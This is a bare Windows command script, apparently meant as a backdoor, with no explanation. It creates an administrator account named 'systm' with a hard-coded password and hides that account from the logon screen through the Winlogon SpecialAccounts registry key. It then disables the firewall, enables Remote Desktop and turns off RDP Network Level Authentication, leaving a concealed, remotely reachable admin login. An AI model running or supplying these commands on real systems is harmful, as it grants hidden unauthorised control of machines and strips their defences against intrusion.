net user systm /add
net localgroup Administrators systm /add
net user systm oursecurepass
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v systm /t REG_DWORD /d 0 /f

powershell.exe -Command "Set-NetConnectionProfile -NetworkCategory Private"
netsh advfirewall set currentprofile state off

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
